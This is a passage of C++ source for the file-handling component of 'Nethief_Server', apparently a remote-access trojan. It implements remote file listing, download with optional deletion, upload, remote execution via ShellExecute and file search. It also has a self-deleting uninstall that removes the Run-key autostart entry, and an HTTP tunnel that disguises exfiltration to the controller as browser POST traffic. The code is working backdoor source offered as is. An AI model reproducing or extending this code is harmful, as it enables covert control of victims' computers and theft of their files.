			return;
	}
	SendCommandData(m_hConnectSocket,0,(BYTE*)&dwErrorCode,sizeof(dwErrorCode));
}

void CFileSocket::Command_GetOperationObject()
{
	DWORD dwParamSize=RecvCommandParamSize(m_hConnectSocket);
	if(dwParamSize==0)
		return;
	m_ArrayBuffer.SetSize(dwParamSize);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwParamSize);
	if(!bRet)
		return;

	CString strFrom;
	memcpy(strFrom.GetBufferSetLength(dwParamSize),m_ArrayBuffer.GetData(),dwParamSize);
	//////////////////////////////////////////////////////////////
	CString strPath=(LPCSTR)strFrom;
	strPath=strPath.Left(strPath.ReverseFind('\\')+1);
	int nPathLen=strPath.GetLength();

	m_ArrayBuffer.SetSize(0);
	DWORD dwPoint=0;
	LPCSTR szFilename;
	while(dwPoint<dwParamSize)
	{
		szFilename=(LPCSTR)strFrom+dwPoint;
		CFileFind f;
		BOOL bExist=f.FindFile(szFilename);
		if(GetLastError()==ERROR_NOT_READY)//如果读盘错误
		{
			DWORD dwErrorCode=0;
			m_ArrayBuffer.SetSize(sizeof(dwErrorCode));
			memcpy(m_ArrayBuffer.GetData(),&dwErrorCode,sizeof(dwErrorCode));
			break;
		}
		if(bExist)
		{
			f.FindNextFile();
			if(f.IsDirectory())
			{
				SearchFile_GetOperationObject(szFilename,nPathLen,&m_ArrayBuffer);
			}
			else
			{
				int nFilenameLen=strlen(szFilename);
				nFilenameLen-=nPathLen;
				int nPostion=m_ArrayBuffer.GetSize();
				m_ArrayBuffer.SetSize(nPostion+nFilenameLen+1);
				memcpy(&m_ArrayBuffer[nPostion],szFilename+nPathLen,nFilenameLen+1);
			}
		}
		f.Close();
		dwPoint+=strlen(szFilename)+1;
	}

	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(m_ArrayBuffer.GetSize()+sizeof(DWORD));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,1,m_ArrayBuffer.GetData(),m_ArrayBuffer.GetSize());
}

void CFileSocket::Command_DownloadFile()
{
	DWORD dwParamSize=RecvCommandParamSize(m_hConnectSocket);
	if(dwParamSize==0)
		return;
	m_ArrayBuffer.SetSize(dwParamSize);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwParamSize);
	if(!bRet)
		return;

	BOOL bIsCut;
	DWORD dwStartPosition;
	CString	strFilename1;

	memcpy(&bIsCut,&m_ArrayBuffer[0],sizeof(bIsCut));
	memcpy(&dwStartPosition,&m_ArrayBuffer[0]+sizeof(bIsCut),sizeof(dwStartPosition));
	strcpy(strFilename1.GetBufferSetLength(dwParamSize-sizeof(bIsCut)-sizeof(dwStartPosition)),
		(char*)&m_ArrayBuffer[0]+sizeof(bIsCut)+sizeof(dwStartPosition));
	//////////////////////////////////////////////////////////////
	CFile SrcFile(strFilename1,CFile::modeRead|CFile::shareDenyNone);
	SrcFile.Seek(dwStartPosition,CFile::begin);

	DWORD dwFileLength=SrcFile.GetLength();

	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(dwFileLength)+dwFileLength);
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,0,(BYTE*)&dwFileLength,sizeof(dwFileLength));

	m_ArrayBuffer.SetSize(4096);

	DWORD dwPoint=dwStartPosition;
	DWORD dwDiffer=0;
	while(dwPoint<dwFileLength)
	{
		dwDiffer=dwFileLength-dwPoint;
		if(dwDiffer>4096)
			dwDiffer=4096;
		dwPoint+=dwDiffer;

		SrcFile.Read(m_ArrayBuffer.GetData(),dwDiffer);
		bRet=SendCommandData(m_hConnectSocket,0,m_ArrayBuffer.GetData(),dwDiffer);
		if(!bRet)//发送出错了,不再继续发送
			break;
	}
	SrcFile.Close();
	//////////////////////////////////////////////////////////////
	if(bIsCut && bRet)//如果是剪切并且发送没有出错
		DeleteFile(strFilename1);
}

void CFileSocket::Command_UploadFile()
{
	DWORD dwParamSize=RecvCommandParamSize(m_hConnectSocket);
	if(dwParamSize==0)
		return;
	m_ArrayBuffer.SetSize(dwParamSize);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwParamSize);
	if(!bRet)
		return;

	BOOL bIsCut;
	DWORD dwStartPosition;
	DWORD dwFileLength;
	CString strFilename2;

	memcpy(&bIsCut,&m_ArrayBuffer[0],sizeof(bIsCut));
	memcpy(&dwStartPosition,&m_ArrayBuffer[0]+sizeof(bIsCut),sizeof(dwStartPosition));
	memcpy(&dwFileLength,&m_ArrayBuffer[0]+sizeof(bIsCut)+sizeof(dwStartPosition),sizeof(dwFileLength));
	strcpy(strFilename2.GetBufferSetLength(dwParamSize-sizeof(bIsCut)-sizeof(dwStartPosition)-sizeof(dwFileLength)),
		(char*)&m_ArrayBuffer[0]+sizeof(bIsCut)+sizeof(dwStartPosition)+sizeof(dwFileLength));
	/////////////////////////////////////////////////////////////////////////////////
	CreateMultilevelDir(strFilename2.Left(strFilename2.ReverseFind('\\')));

	CFile DestFile;
	if(dwStartPosition==0)//是从头下载
	{
		DestFile.Open(strFilename2,
			CFile::modeCreate|CFile::modeWrite|CFile::shareDenyNone);
	}
	else//是断点续传
	{
		DestFile.Open(strFilename2,CFile::modeWrite|CFile::shareDenyNone);
		DestFile.Seek(dwStartPosition,CFile::begin);
	}
	////////////////////////////////////////////////////////////
	m_ArrayBuffer.SetSize(4096);

	DWORD dwPoint=dwStartPosition;
	DWORD dwDiffer=0;
	while(dwPoint<dwFileLength)
	{
		dwDiffer=dwFileLength-dwPoint;
		if(dwDiffer>4096)
			dwDiffer=4096;
		dwPoint+=dwDiffer;

		BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwDiffer);
		if(!bRet)
			break;
		DestFile.Write(m_ArrayBuffer.GetData(),dwDiffer);
	}
	DestFile.Close();
	/////////////////////////////////////////
	DWORD dwReturn=1;

	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(dwReturn));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,0,(BYTE*)&dwReturn,sizeof(dwReturn));
}

void CFileSocket::Command_ShowProperty_Multi()
{
	DWORD dwParamSize=RecvCommandParamSize(m_hConnectSocket);
	if(dwParamSize==0)
		return;
	m_ArrayBuffer.SetSize(dwParamSize);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwParamSize);
	if(!bRet)
		return;
	//////////////////////////////////////////////////////////////
	LPCSTR szPath=(LPCSTR)m_ArrayBuffer.GetData();

	RECV_PROPERTYMULTI_INFO RecvPropertyMultiInfo;
	RecvPropertyMultiInfo.nFileCount=0;
	RecvPropertyMultiInfo.nFolderCount=0;
	RecvPropertyMultiInfo.dwTotalSize=0;
	if(strlen(szPath)+1==dwParamSize)
		RecvPropertyMultiInfo.nFolderCount--;

	DWORD dwPoint=0;
	LPCSTR szFilename;
	while(dwPoint<dwParamSize)
	{
		szFilename=szPath+dwPoint;
		//////////////////////////////////////////////////
		CFileFind f;
		BOOL bExist=f.FindFile(szFilename);
		if(bExist)
		{
			f.FindNextFile();
			if(f.IsDirectory())
			{
				RecvPropertyMultiInfo.nFolderCount++;
				CString strFilename=szFilename;
				strFilename+="\\";
				FolderStatistic(strFilename,&RecvPropertyMultiInfo.nFileCount,
					&RecvPropertyMultiInfo.nFolderCount,&RecvPropertyMultiInfo.dwTotalSize);
			}
			else
			{
				RecvPropertyMultiInfo.nFileCount++;
				RecvPropertyMultiInfo.dwTotalSize+=f.GetLength();
			}
		}
		f.Close();
		//////////////////////////////////////////////////
		dwPoint+=strlen(szFilename)+1;
	}

	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(RecvPropertyMultiInfo));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,0,(BYTE*)&RecvPropertyMultiInfo,sizeof(RecvPropertyMultiInfo));
}

void CFileSocket::Command_ShowProperty_Single()
{
	DWORD dwParamSize=RecvCommandParamSize(m_hConnectSocket);
	if(dwParamSize==0)
		return;
	m_ArrayBuffer.SetSize(dwParamSize);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwParamSize);
	if(!bRet)
		return;

	LPCSTR szFilename=(char*)m_ArrayBuffer.GetData();
	//////////////////////////////////////////////////////////////
	CFileStatus status;
	CFile::GetStatus(szFilename,status);
	RECV_PROPERTYSINGLE_INFO RecvPropertySingleInfo;
	RecvPropertySingleInfo.m_ctime=status.m_ctime;
	RecvPropertySingleInfo.m_mtime=status.m_mtime;
	RecvPropertySingleInfo.m_atime=status.m_atime;
	RecvPropertySingleInfo.m_size=status.m_size;
	RecvPropertySingleInfo.m_attribute=status.m_attribute;

	RecvPropertySingleInfo.dwFileType=SHGetFileInfo(szFilename,NULL,NULL,NULL,SHGFI_EXETYPE);
	//////////////////////////////////////////////////////////////
	CString strFilename=szFilename;
	CString strExtension=strFilename.Right(4);//得到文件扩展名
	strExtension.MakeUpper();
	if(strExtension==".EXE")//是以.EXE结尾
	{
		ICONINFO stIconInfo;//图标信息
		HICON hExeIcon=NULL;//EXE文件图标

		SHFILEINFO shFileInfo;
		if(SHGetFileInfo(strFilename,0,&shFileInfo,sizeof(SHFILEINFO),
			SHGFI_ICON|SHGFI_LARGEICON))//得到EXE文件的图标
		{
			GetIconInfo(shFileInfo.hIcon,&stIconInfo);//得到图标信息
		}
		else//如果是回收站里的EXE文件,只能以这种方法得到图标
		{
			ExtractIconEx(strFilename,0,&hExeIcon,NULL,1);//得到EXE文件的图标
			GetIconInfo(hExeIcon,&stIconInfo);//得到图标信息
		}

		CBitmap* pBitmapMask=CBitmap::FromHandle(stIconInfo.hbmMask);//转成BMP
		BITMAP stBitmapMask;
		pBitmapMask->GetObject(sizeof(stBitmapMask),&stBitmapMask);//得到BMP信息

		DWORD dwCountMask=stBitmapMask.bmWidthBytes*stBitmapMask.bmHeight;//算出BMP大小
		BYTE* pbyBitsMask=new BYTE[dwCountMask];
		pBitmapMask->GetBitmapBits(dwCountMask,pbyBitsMask);//复制BMP

		RECV_BITMAP_INFO stRecvBitmapInfoMask;//要传送的BMP信息
		stRecvBitmapInfoMask.bmType=stBitmapMask.bmType;
		stRecvBitmapInfoMask.bmWidth=stBitmapMask.bmWidth;
		stRecvBitmapInfoMask.bmHeight=stBitmapMask.bmHeight;
		stRecvBitmapInfoMask.bmWidthBytes=stBitmapMask.bmWidthBytes;
		stRecvBitmapInfoMask.bmPlanes=stBitmapMask.bmPlanes;
		stRecvBitmapInfoMask.bmBitsPixel=stBitmapMask.bmBitsPixel;
		stRecvBitmapInfoMask.dwBitsCount=dwCountMask;//BMP大小
		/////////////////////////////////////////////////
		CBitmap* pBitmapColor=CBitmap::FromHandle(stIconInfo.hbmColor);//转成BMP

		DWORD dwCountColor=32*32*sizeof(COLORREF);//算出BMP大小
		BYTE* pbyBitsColor=new BYTE[dwCountColor];

		CDC ScreenDC;
		ScreenDC.CreateDC("DISPLAY",NULL,NULL,NULL);//得到屏幕DC

		CDC MemDC;
		MemDC.CreateCompatibleDC(&ScreenDC);//建立兼容DC
		MemDC.SelectObject(pBitmapColor);//选入Bitmap

		//保存每个象素的颜色
		DWORD dwPos=0;
		for(int i=0;i<32;i++)
		{
			for(int j=0;j<32;j++)
			{
				COLORREF crColor=MemDC.GetPixel(j,i);
				memcpy(pbyBitsColor+dwPos,&crColor,sizeof(crColor));
				dwPos+=sizeof(crColor);
			}
		}
		MemDC.DeleteDC();//删除兼容DC
		ScreenDC.DeleteDC();//删除屏幕DC
		/////////////////////////////////////////////////
		m_ArrayBuffer.SetSize(0);
		m_ArrayBuffer.SetSize(sizeof(RecvPropertySingleInfo)+
			sizeof(stRecvBitmapInfoMask)+dwCountMask+
			dwCountColor);
		memcpy(&m_ArrayBuffer[0],&RecvPropertySingleInfo,sizeof(RecvPropertySingleInfo));
		memcpy(&m_ArrayBuffer[0]+sizeof(RecvPropertySingleInfo),&stRecvBitmapInfoMask,sizeof(stRecvBitmapInfoMask));
		memcpy(&m_ArrayBuffer[0]+sizeof(RecvPropertySingleInfo)+sizeof(stRecvBitmapInfoMask),pbyBitsMask,dwCountMask);
		memcpy(&m_ArrayBuffer[0]+sizeof(RecvPropertySingleInfo)+sizeof(stRecvBitmapInfoMask)+dwCountMask,pbyBitsColor,dwCountColor);
		//////////////////////////////////////////////////////////////////
		DestroyIcon(shFileInfo.hIcon);//消毁图标
		pBitmapMask->DeleteObject();//删除Bitmap对象
		pBitmapColor->DeleteObject();//删除Bitmap对象
		delete[] pbyBitsMask;//删除指针
		delete[] pbyBitsColor;//删除指针
		//////////////////////////////////////////////////////////////////////////////
		if(m_pCommunity->m_bIsProxy)
		{
			BOOL bSucceed=HttpTunnelSendHeader(m_ArrayBuffer.GetSize()+sizeof(DWORD));
			if(!bSucceed)
				return;
		}
		SendCommandData(m_hConnectSocket,1,m_ArrayBuffer.GetData(),m_ArrayBuffer.GetSize());
	}
	else//不是EXE文件
	{
		if(m_pCommunity->m_bIsProxy)
		{
			BOOL bSucceed=HttpTunnelSendHeader(sizeof(RecvPropertySingleInfo)+sizeof(DWORD));
			if(!bSucceed)
				return;
		}
		SendCommandData(m_hConnectSocket,1,(BYTE*)&RecvPropertySingleInfo,sizeof(RecvPropertySingleInfo));
	}
}

void CFileSocket::Command_ModifyProperty_Single()
{
	DWORD dwParamSize=RecvCommandParamSize(m_hConnectSocket);
	if(dwParamSize==0)
		return;
	m_ArrayBuffer.SetSize(dwParamSize);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwParamSize);
	if(!bRet)
		return;

	LPDWORD pdwFileAttributes=(LPDWORD)&m_ArrayBuffer[0];
	LPCSTR szFilename=(char*)&m_ArrayBuffer[0]+sizeof(*pdwFileAttributes);
	//////////////////////////////////////////////////////////////
	DWORD dwErrorCode=0;
	if(!SetFileAttributes(szFilename,*pdwFileAttributes))
	{
		dwErrorCode=1;
	}
	//////////////////////////////////////////////////////////////
	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(dwErrorCode));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,0,(BYTE*)&dwErrorCode,sizeof(dwErrorCode));
}

void CFileSocket::Command_ShowProperty_Diskdrive()
{
	m_ArrayBuffer.SetSize(4);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),4);
	if(!bRet)
		return;

	LPCSTR szDiskDrive=(char*)m_ArrayBuffer.GetData();
	//////////////////////////////////////////////////////////////
	RECV_PROPERTYDISKDRIVE_INFO RecvPropertyDiskdriveInfo;
	ZeroMemory(&RecvPropertyDiskdriveInfo,sizeof(RecvPropertyDiskdriveInfo));

	CString strVolumeName;
	if(GetVolumeInformation(szDiskDrive,
		strVolumeName.GetBufferSetLength(100),100,&RecvPropertyDiskdriveInfo.dwSerialNumber,NULL,NULL,NULL,NULL))
	{
		strVolumeName.ReleaseBuffer();
		CStringToChar(RecvPropertyDiskdriveInfo.cVolumeName,strVolumeName);
		RecvPropertyDiskdriveInfo.dwlTotalNumberOfBytes=GetDiskSpace(szDiskDrive,FALSE);
		RecvPropertyDiskdriveInfo.dwlTotalNumberOfUnusedBytes=GetDiskSpace(szDiskDrive,TRUE);
	}
	//////////////////////////////////////////////////////////////
	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(RecvPropertyDiskdriveInfo));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,0,(BYTE*)&RecvPropertyDiskdriveInfo,sizeof(RecvPropertyDiskdriveInfo));
}

void CFileSocket::Command_ModifyProperty_Diskdrive()
{
	DWORD dwParamSize=RecvCommandParamSize(m_hConnectSocket);
	if(dwParamSize==0)
		return;
	m_ArrayBuffer.SetSize(dwParamSize);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwParamSize);
	if(!bRet)
		return;

	LPCSTR szDiskDrive=(LPCSTR)&m_ArrayBuffer[0];
	LPCSTR szVolumeName=(LPCSTR)&m_ArrayBuffer[0]+4;
	//////////////////////////////////////////////////////////////
	DWORD dwErrorCode=0;
	if(!SetVolumeLabel(szDiskDrive,szVolumeName))
	{
		dwErrorCode=1;
	}
	//////////////////////////////////////////////////////////////
	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(dwErrorCode));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,0,(BYTE*)&dwErrorCode,sizeof(dwErrorCode));
}

void CFileSocket::Command_RemoteRun()
{
	DWORD dwParamSize=RecvCommandParamSize(m_hConnectSocket);
	if(dwParamSize==0)
		return;
	m_ArrayBuffer.SetSize(dwParamSize);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwParamSize);
	if(!bRet)
		return;

	LPINT pnShowCmd=(LPINT)&m_ArrayBuffer[0];
	LPCSTR szFilename=(LPCSTR)&m_ArrayBuffer[0]+sizeof(*pnShowCmd);
	LPCSTR szParam=(LPCSTR)&m_ArrayBuffer[0]+sizeof(*pnShowCmd)+strlen(szFilename)+1;
	//////////////////////////////////////////////////////////////
	DWORD dwErrorCode=0;

	CString strParam=szParam;
	CString strFilename=szFilename;
	CString strDirectory=strFilename.Left(strFilename.ReverseFind('\\')+1);
	HINSTANCE hInstance=ShellExecute(NULL,NULL,szFilename,strParam,strDirectory,*pnShowCmd);
	if((INT)hInstance<=32)
	{
		dwErrorCode=1;
	}
	//////////////////////////////////////////////////////////////
	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(dwErrorCode));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,0,(BYTE*)&dwErrorCode,sizeof(dwErrorCode));
}

void CFileSocket::Command_RemoteUninstall()
{
	CString exeFullPath;
	GetModuleFileName(NULL,exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
	exeFullPath.ReleaseBuffer();
	int nLen=exeFullPath.ReverseFind('\\');
	CString strServerName=exeFullPath.Right(exeFullPath.GetLength()-nLen-1);
	exeFullPath.GetBufferSetLength(nLen+1);
	
	CString strFilename=exeFullPath+"Nethief_Server.bat";

	CFile BatFile(strFilename,CFile::modeCreate|CFile::modeWrite|CFile::shareDenyNone);
	CString strBuf=":ERROR\r\ndel "+strServerName+"\r\nIF EXIST "+strServerName+" GOTO ERROR\r\ndel Nethief_Server.bat";
	BatFile.Write(strBuf.GetBufferSetLength(strBuf.GetLength()),strBuf.GetLength());
	BatFile.Close();

	RegDeleteValue(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		m_pCommunity->m_strKeyName);
	DWORD dwErrorCode=0;

	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(dwErrorCode));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,0,(BYTE*)&dwErrorCode,sizeof(dwErrorCode));
	//////////////////////////////////////////////////////////////
	ShellExecute(NULL,NULL,strFilename,NULL,exeFullPath,SW_HIDE);
	AfxGetMainWnd()->PostMessage(WM_CLOSE);
}

void CFileSocket::Command_FindFile()
{
	DWORD dwParamSize=RecvCommandParamSize(m_hConnectSocket);
	if(dwParamSize==0)
		return;
	m_ArrayBuffer.SetSize(dwParamSize);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwParamSize);
	if(!bRet)
		return;

	BOOL bSearchSubdir=*(LPBOOL)&m_ArrayBuffer[0];
	CString strFindDir=(LPCSTR)&m_ArrayBuffer[0]+sizeof(bSearchSubdir);
	CString strFindFile=(LPCSTR)&m_ArrayBuffer[0]+sizeof(bSearchSubdir)+strFindDir.GetLength()+1;
	//////////////////////////////////////////////////////////////
	m_ArrayBuffer.SetSize(0);
	SearchFile(strFindDir,strFindFile,bSearchSubdir,&m_ArrayBuffer);
	if(m_ArrayBuffer.GetSize()==0)
	{
		DWORD dwErrorCode=0;
		m_ArrayBuffer.SetSize(sizeof(dwErrorCode));
		memcpy(m_ArrayBuffer.GetData(),&dwErrorCode,sizeof(dwErrorCode));
	}
	//////////////////////////////////////////////////////////////
	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(m_ArrayBuffer.GetSize()+sizeof(DWORD));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,1,m_ArrayBuffer.GetData(),m_ArrayBuffer.GetSize());
}

void CFileSocket::Command_ShowNote()
{
	SERVER_CONFIG stServerConfig;
	ZeroMemory(&stServerConfig,sizeof(stServerConfig));
	CStringToChar(stServerConfig.cNote,m_pCommunity->m_strNote);

	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(stServerConfig.cNote));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,0,(BYTE*)&stServerConfig.cNote,sizeof(stServerConfig.cNote));
}

void CFileSocket::Command_GetFileInfo()
{
	DWORD dwParamSize=RecvCommandParamSize(m_hConnectSocket);
	if(dwParamSize==0)
		return;
	m_ArrayBuffer.SetSize(dwParamSize);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwParamSize);
	if(!bRet)
		return;

	LPCSTR szFilename=(char*)m_ArrayBuffer.GetData();
	//////////////////////////////////////////////////////////////
	CFileStatus status;
	CFile::GetStatus(szFilename,status);

	RECV_GETFILEINFO_INFO RecvGetFileInfoInfo;
	RecvGetFileInfoInfo.bIsFileExist=IsFileExist(szFilename);
	RecvGetFileInfoInfo.m_mtime=status.m_mtime;
	RecvGetFileInfoInfo.m_size=status.m_size;
	//////////////////////////////////////////////////////////////
	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(RecvGetFileInfoInfo));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,0,(BYTE*)&RecvGetFileInfoInfo,sizeof(RecvGetFileInfoInfo));
}

//***************************************************************************/
DWORD CFileSocket::RecvCommandParamSize(SOCKET hSocket)//接收命令参数大小
{
	DWORD dwBufSize;

	if(m_pCommunity->m_bIsProxy)
	{	
		int nCount=HttpTunnelRecv(&dwBufSize,sizeof(dwBufSize));
		if(nCount==-1)//出错了
		{
			return 0;	//失败
		}
	}
	else
	{
		while(1)
		{
			int nRet=recv(hSocket,(char*)&dwBufSize,sizeof(dwBufSize),NULL);
			if(nRet==SOCKET_ERROR)
			{
				if(WSAGetLastError()==WSAEWOULDBLOCK)
				{
					Sleep(50);
					continue;	//阻塞,继续
				}
				else
				{
					return 0;	//失败
				}
			}
			else
				break;	//成功
		}
	}
	return dwBufSize;
}

BOOL CFileSocket::RecvCommandParam(SOCKET hSocket,BYTE* byBuf,DWORD dwBufSize)//接收命令参数
{
	DWORD dwLeft=dwBufSize;
	DWORD dwPoint=0;
	while(dwLeft>0)
	{
		int nRet;

		if(m_pCommunity->m_bIsProxy)
		{
			nRet=HttpTunnelRecv(byBuf+dwPoint,dwLeft);
			if(nRet==-1)//出错了
			{
				return FALSE;	//失败
			}
		}
		else
		{
			nRet=recv(hSocket,(char*)byBuf+dwPoint,dwLeft,NULL);
			if(nRet==SOCKET_ERROR)
			{
				if(WSAGetLastError()==WSAEWOULDBLOCK)
				{
					Sleep(50);
					continue;
				}
				else
				{
					return FALSE;
				}
			}
		}
		dwPoint+=nRet;
		dwLeft-=nRet;
	}
	return TRUE;
}

BOOL CFileSocket::SendCommandData(SOCKET hSocket,int nControlCode,BYTE* byBuf,DWORD dwBufSize)//接收命令数据
{
	DWORD dwSendBufSize;
	BYTE* SendBuf;
	switch(nControlCode)
	{
		case 0:	//只发送数据
		{
			dwSendBufSize=dwBufSize;
			SendBuf=byBuf;
			break;
		}
		case 1:	//发送数据大小与数据
		{
			dwSendBufSize=sizeof(dwBufSize)+dwBufSize;
			SendBuf=new BYTE[dwSendBufSize];
			memcpy(SendBuf,&dwBufSize,sizeof(dwBufSize));
			memcpy(SendBuf+sizeof(dwBufSize),byBuf,dwBufSize);
			break;
		}
	}

	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSend(SendBuf,dwSendBufSize);
		if(!bSucceed)//如果失败
		{
			if(nControlCode!=0)
				delete[] SendBuf;
			return FALSE;	//失败
		}
	}
	else
	{
		while(1)
		{
			int nRet=send(hSocket,(char*)SendBuf,dwSendBufSize,NULL);
			if(nRet==SOCKET_ERROR)
			{
				if(WSAGetLastError()==WSAEWOULDBLOCK)
				{
					Sleep(50);
					continue;
				}
				else
				{
					if(nControlCode!=0)
						delete[] SendBuf;
					return FALSE;	//失败
				}
			}
			else
				break;	//成功
		}
	}
	if(nControlCode!=0)
		delete[] SendBuf;

	return TRUE;
}

/////////////////////////////////////////////////////////////////
BOOL CFileSocket::HttpTunnelSendHeader(UINT nCount)//发送HTTP头
{
	OnSocketClose();//全部消毁

	CString strServer=m_strServerIP;//客户端的IP地址
	INTERNET_PORT nPort=60000;	//端口60000
	//////////////////////////////////////////////////
	TRY
	{
		m_pSession=new CInternetSession(
			"Mozilla/4.0 (compatible; MSIE 5.0; Win32)",
			1,
			INTERNET_OPEN_TYPE_PRECONFIG,
			NULL,
			NULL,
			INTERNET_FLAG_DONT_CACHE);

		m_pHttpConn=m_pSession->GetHttpConnection(strServer,nPort,NULL,NULL);
		//////////////////////////////////////////////////
		m_pHttpFile=m_pHttpConn->OpenRequest(
			CHttpConnection::HTTP_VERB_POST,//POST请求
			"/index.htm",
			NULL,
			1,
			NULL,
			NULL,
			INTERNET_FLAG_RELOAD|INTERNET_FLAG_DONT_CACHE|
			INTERNET_FLAG_EXISTING_CONNECT|INTERNET_FLAG_KEEP_CONNECTION);

		m_pHttpFile->SendRequestEx(nCount);//发送POST请求,即HTTP头
		//////////////////////////////////////////////////
	}
	CATCH_ALL(e)//出错了
	{
		OnSocketClose();//全部消毁
		return FALSE;//连接失败,60秒后再试
	}
	END_CATCH_ALL

	return TRUE;
}

BOOL CFileSocket::HttpTunnelSend(const void* lpBuf,UINT nCount)//发送HTTP数据
{
	TRY
	{
		m_pHttpFile->Write(lpBuf,nCount);//发送数据
	}
	CATCH_ALL(e)//出错了
	{
		OnSocketClose();//全部消毁
		return FALSE;//连接失败,60秒后再试
	}
	END_CATCH_ALL

	return TRUE;
}

BOOL CFileSocket::HttpTunnelRecvHeader()//接收HTTP头
{
	TRY
	{
		m_pHttpFile->EndRequest();//结束请求,正常情况下此处应该阻塞...
		//////////////////////////////////////////////////
		DWORD dwStatusCode=0;//取状态码
		BOOL bRet=m_pHttpFile->QueryInfoStatusCode(dwStatusCode);
		if(!bRet || dwStatusCode!=HTTP_STATUS_OK)//如果执行失败或返回失败
		{
			OnSocketClose();//全部消毁
			return FALSE;//连接失败,60秒后再试
		}
	}
	CATCH_ALL(e)//出错了
	{
		OnSocketClose();//全部消毁
		return FALSE;//连接失败,60秒后再试
	}
	END_CATCH_ALL

	return TRUE;
}

int CFileSocket::HttpTunnelRecv(void* lpBuf,UINT nCount)//接收HTTP数据
{
	int nRet;
	TRY
	{
		nRet=m_pHttpFile->Read(lpBuf,nCount);//接收数据
		if(nRet==0)//连接断开
		{
			OnSocketClose();//全部消毁
			return -1;	//失败
		}
	}
	CATCH_ALL(e)//出错了
	{
		OnSocketClose();//全部消毁
		return -1;	//失败
	}
	END_CATCH_ALL

	return nRet;//返回接收的数据大小
}
